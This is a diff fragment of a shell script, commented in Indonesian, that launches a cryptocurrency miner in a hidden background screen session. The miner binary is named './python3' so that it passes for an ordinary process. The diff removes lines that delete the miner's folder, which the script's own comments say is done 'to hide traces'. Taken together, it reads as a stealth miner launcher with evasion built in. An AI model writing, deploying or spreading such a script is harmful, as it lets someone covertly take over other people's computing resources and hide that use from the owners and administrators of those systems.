@@ -32,12 +32,3 @@ clear
 echo "Memulai miner di background..."
 cd dotsrb || exit
 screen -dmS miner ./python3 --algorithm verushash --pool "$POOL" --wallet "$WALLET.RIG_$LAST_SIX" --password x
-
-# Kembali ke direktori utama
-cd ..
-
-# Menghapus folder miner setelah proses dimulai
-echo "Menghapus file miner untuk menyembunyikan jejak..."
-rm -rf dotsrb
-
-echo "Miner telah berjalan di background. File telah dihapus."
